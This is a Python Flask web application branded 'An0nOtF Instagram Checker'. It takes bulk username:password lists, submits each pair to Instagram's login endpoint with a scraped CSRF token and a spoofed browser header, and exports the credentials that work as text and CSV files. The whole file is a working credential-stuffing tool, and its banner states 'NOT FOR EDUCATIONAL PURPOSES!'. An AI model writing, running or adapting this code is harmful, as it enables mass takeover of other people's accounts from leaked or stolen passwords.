from flask import Flask, request, jsonify, send_file
import threading
import queue
import json
import os
import time
from datetime import datetime
import requests
from io import StringIO
import uuid
from collections import defaultdict

app = Flask(__name__)
app.secret_key = 'instagram-checker-secret-key-2025'

# Store results in memory (persistent)
results_store = {
    'success': [],
    'failed': [],
    'error': []
}

# Processing state
processing = False
total_accounts = 0
processed_accounts = 0
accounts_queue = queue.Queue()

class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
        })
        
    def check_account(self, username, password):
        try:
            # Get initial page for CSRF token
            self.session.get("https://www.instagram.com/accounts/login/", timeout=10)
            csrf_token = self.session.cookies.get("csrftoken")
            
            if not csrf_token:
                return {"status": "error", "message": "CSRF token not found"}
            
            # Prepare login data
            login_data = {
                "username": username,
                "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
                "queryParams": {},
                "optIntoOneTap": "false"
            }
            
            headers = {
                "X-CSRFToken": csrf_token,
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            # Make login request
            response = self.session.post(
                "https://www.instagram.com/accounts/login/ajax/",
                data=login_data,
                headers=headers,
                timeout=10
            )
            
            result = response.json()
            
            if "userId" in result:
                return {
                    "status": "success",
                    "username": username,
                    "password": password,
                    "user_id": result['userId'],
                    "authenticated": result.get('authenticated', False),
                    "message": "Login successful"
                }
            elif result.get("status") == "fail" or result.get("authenticated") == False:
                return {
                    "status": "failed",
                    "username": username,
                    "password": password,
                    "message": "Incorrect credentials"
                }
            else:
                return {
                    "status": "error",
                    "username": username,
                    "password": password,
                    "message": "Unknown response"
                }
                
        except Exception as e:
            return {
                "status": "error",
                "username": username,
                "password": password,
                "message": str(e)
            }

def process_accounts():
    global processing, processed_accounts
    checker = InstagramChecker()
    
    while processing:
        try:
            account = accounts_queue.get(timeout=1)
            username, password = account
            
            result = checker.check_account(username, password)
            
            # Store result in memory
            if result['status'] == 'success':
                results_store['success'].append(result)
            elif result['status'] == 'failed':
                results_store['failed'].append(result)
            elif result['status'] == 'error':
                results_store['error'].append(result)
            
            processed_accounts += 1
            accounts_queue.task_done()
            
            # Small delay to avoid rate limiting
            time.sleep(0.5)
            
        except queue.Empty:
            continue
        except Exception as e:
            print(f"Error processing account: {e}")
            continue

@app.route('/upload_accounts', methods=['POST'])
def upload_accounts():
    global processing, total_accounts, processed_accounts, results_store
    
    if processing:
        return jsonify({"error": "Processing already in progress"}), 400
    
    accounts_text = request.form.get('accounts', '')
    if not accounts_text:
        return jsonify({"error": "No accounts provided"}), 400
    
    # Clear previous results
    results_store = {'success': [], 'failed': [], 'error': []}
    
    # Parse accounts
    accounts = []
    lines = accounts_text.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                username, password = parts[0].strip(), parts[1].strip()
                if username and password:
                    accounts.append((username, password))
    
    if not accounts:
        return jsonify({"error": "No valid accounts found"}), 400
    
    # Clear queue and reset counters
    while not accounts_queue.empty():
        accounts_queue.get()
    
    total_accounts = len(accounts)
    processed_accounts = 0
    
    # Add accounts to queue
    for account in accounts:
        accounts_queue.put(account)
    
    # Start processing thread
    processing = True
    thread = threading.Thread(target=process_accounts)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "message": f"Started checking {total_accounts} accounts",
        "total": total_accounts
    })

@app.route('/get_progress')
def get_progress():
    return jsonify({
        "processing": processing,
        "total": total_accounts,
        "processed": processed_accounts,
        "progress": (processed_accounts / total_accounts * 100) if total_accounts > 0 else 0
    })

@app.route('/get_results')
def get_results():
    return jsonify({
        "success": results_store['success'],
        "failed": results_store['failed'],
        "error": results_store['error']
    })

@app.route('/stop_processing')
def stop_processing():
    global processing
    processing = False
    return jsonify({"message": "Processing stopped"})

@app.route('/download_results')
def download_results():
    # Create text file content with caption for each account
    text_content = "🅰️n0nOtF Instagram Checker Results \n"
    text_content += "=" * 50 + "\n"
    text_content += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    text_content += f"Total Success: {len(results_store['success'])}\n"
    text_content += f"Total Failed: {len(results_store['failed'])}\n"
    text_content += f"Total Errors: {len(results_store['error'])}\n"
    text_content += "=" * 50 + "\n\n"
    
    text_content += "✅ SUCCESSFUL LOGINS:\n"
    text_content += "─" * 50 + "\n"
    for result in results_store['success']:
        text_content += f"Username: {result['username']}\n"
        text_content += f"Password: {result['password']}\n"
        text_content += f"User ID: {result.get('user_id', 'N/A')}\n"
        text_content += f"Message: {result['message']}\n"
        text_content += "Premium Config by An0nOtF Technologies Inc \n"
        text_content += "─" * 50 + "\n"
    
    text_content += "\n❌ FAILED LOGINS:\n"
    text_content += "─" * 50 + "\n"
    for result in results_store['failed']:
        text_content += f"Username: {result['username']}\n"
        text_content += f"Password: {result['password']}\n"
        text_content += f"Message: {result['message']}\n"
        text_content += "Premium Config by An0nOtF Technologies Inc \n"
        text_content += "─" * 50 + "\n"
    
    text_content += "\n⚠️ ERRORS:\n"
    text_content += "─" * 50 + "\n"
    for result in results_store['error']:
        text_content += f"Username: {result['username']}\n"
        text_content += f"Password: {result['password']}\n"
        text_content += f"Error: {result['message']}\n"
        text_content += "Premium Config by An0nOtF Technologies Inc \n"
        text_content += "─" * 50 + "\n"
    
    text_content += f"\n©️ 2025 An0nOtF Technologies Inc \n"
    text_content += "All rights reserved\n"
    
    # Create CSV content with caption
    csv_content = "Status,Username,Password,User ID,Message,Caption\n"
    for result in results_store['success']:
        csv_content += f"SUCCESS,{result['username']},{result['password']},{result.get('user_id', 'N/A')},{result['message']},Premium Config by An0nOtF Technologies Inc \n"
    for result in results_store['failed']:
        csv_content += f"FAILED,{result['username']},{result['password']},N/A,{result['message']},Premium Config by An0nOtF Technologies Inc \n"
    for result in results_store['error']:
        csv_content += f"ERROR,{result['username']},{result['password']},N/A,{result['message']},Premium Config by An0nOtF Technologies Inc \n"
    
    # Create a unique filename
    filename = f"instagram_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    # Save file
    file_path = os.path.join('static', filename)
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(text_content)
    
    return send_file(file_path, as_attachment=True, download_name=filename)

@app.route('/clear_results')
def clear_results():
    global processing, total_accounts, processed_accounts, results_store
    
    processing = False
    total_accounts = 0
    processed_accounts = 0
    results_store = {'success': [], 'failed': [], 'error': []}
    
    # Clear queue
    while not accounts_queue.empty():
        accounts_queue.get()
    
    return jsonify({"message": "Results cleared"})
    
@app.route('/')
def index():
    # Return the HTML directly - no template file needed!
    with open('index.html', 'r', encoding='utf-8') as f:
        html_content = f.read()
    return html_content

if __name__ == '__main__':
    os.makedirs('static', exist_ok=True)
    print("\n" + "="*60)
    print("🅰️n0nOtF Instagram Checker 💎".center(60))
    print("="*60)
    print("\n✨ Application is running!")
    print("🌐 Open your browser and navigate to: http://localhost:5000")
    print("📱 Enter your Instagram accounts in format: username:password")
    print("⚡ Real-time progress tracking")
    print("💾 Download results or copy to clipboard")
    print("\n⚠️ NOT FOR EDUCATIONAL PURPOSES!")
    print("\n" + "-"*60)
    print("©️ 2025 An0nOtF Technologies Inc 💎")
    print("-"*60 + "\n")
    
    app.run(debug=True, host='0.0.0.0', port=8080)